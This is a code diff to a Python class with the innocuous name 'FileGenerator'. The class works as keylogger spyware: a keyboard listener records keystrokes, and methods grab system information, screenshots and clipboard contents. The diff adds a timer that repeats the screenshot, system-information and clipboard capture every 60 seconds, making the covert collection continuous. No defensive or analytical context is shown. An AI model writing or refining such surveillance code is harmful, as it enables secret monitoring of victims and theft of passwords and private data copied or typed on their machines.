@@ -68,16 +68,12 @@ class FileGenerator:
         except Exception as e:
             logging.error(f"Failed to save log file: {e}")
 
-    def get_clipboard_content(self, max_retries=5):
-        clipboard_content = "Could not access clipboard"
-        for i in range(max_retries):
-            try:
-                clipboard_content = pyperclip.paste()
-                break
-            except pyperclip.PyperclipException as e:
-                logging.error(f"Error accessing clipboard (attempt {i+1}): {e}")
-                time.sleep(1)  # Wait a bit before retrying
-        self.appendlog(f"Clipboard content: {clipboard_content}\n")
+    def periodic_tasks(self):
+        self.system_information()
+        self.screenshot()
+        self.get_clipboard_content()
+        # Reset the timer
+        threading.Timer(60, self.periodic_tasks).start()
 
     def system_information(self):
         try:
@@ -101,11 +97,20 @@ class FileGenerator:
         except Exception as e:
             logging.error(f"Failed to take screenshot: {e}")
 
+    def get_clipboard_content(self):
+        clipboard_content = "Could not access clipboard"
+        for i in range(5):  # max_retries is 5
+            try:
+                clipboard_content = pyperclip.paste()
+                break
+            except pyperclip.PyperclipException as e:
+                logging.error(f"Error accessing clipboard (attempt {i+1}): {e}")
+                time.sleep(1)  # Wait a bit before retrying
+        self.appendlog(f"Clipboard content: {clipboard_content}\n")
+
     def run(self):
-        # Schedule periodic tasks or use threads as needed
-        self.system_information()
-        self.screenshot()
-        threading.Thread(target=self.get_clipboard_content).start()
+        # Start periodic tasks
+        self.periodic_tasks()
 
         # Start the keyboard listener
         keyboard_listener = keyboard.Listener(on_press=self.save_data)
